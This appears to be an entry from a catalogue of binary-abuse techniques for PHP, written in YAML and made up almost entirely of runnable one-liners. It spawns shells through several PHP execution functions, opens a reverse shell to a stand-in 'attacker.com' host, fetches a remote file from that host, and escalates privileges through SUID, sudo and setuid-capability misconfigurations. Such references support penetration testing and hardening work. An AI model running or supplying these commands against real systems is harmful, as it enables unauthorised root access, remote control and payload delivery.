---
functions:
  shell:
    - code: |
        export CMD="/bin/sh"
        php -r 'system(getenv("CMD"));'
    - code: |
        export CMD="/bin/sh"
        php -r 'passthru(getenv("CMD"));'
    - code: |
        export CMD="/bin/sh"
        php -r 'print(shell_exec(getenv("CMD")));'
    - code: |
        export CMD="/bin/sh"
        php -r '$r=array(); exec(getenv("CMD"), $r); print(join("\\n",$r));'
    - code: |
        export CMD="/bin/sh"
        php -r '$h=@popen(getenv("CMD"),"r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
  command:
    - code: |
        export CMD="id"
        php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open(getenv("CMD"), $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        php -r '$sock=fsockopen(getenv("RHOST"),getenv("RPORT"));exec("/bin/sh -i <&3 >&3 2>&3");'
  file-upload:
    - description: Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.
      code: |
        LHOST=0.0.0.0
        LPORT=8888
        php -S $LHOST:$LPORT
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        export URL=http://attacker.com/file_to_get
        export LFILE=file_to_save
        php -r '$c=file_get_contents(getenv("URL"));file_put_contents(getenv("LFILE"), $c);'
  suid:
    - code: |
        CMD="/bin/sh"
        ./php -r "pcntl_exec('/bin/sh', ['-p']);"
  sudo:
    - code: |
        CMD="/bin/sh"
        sudo php -r "system('$CMD');"
  capabilities:
    - code: |
        CMD="/bin/sh"
        ./php -r "posix_setuid(0); system('$CMD');"
---
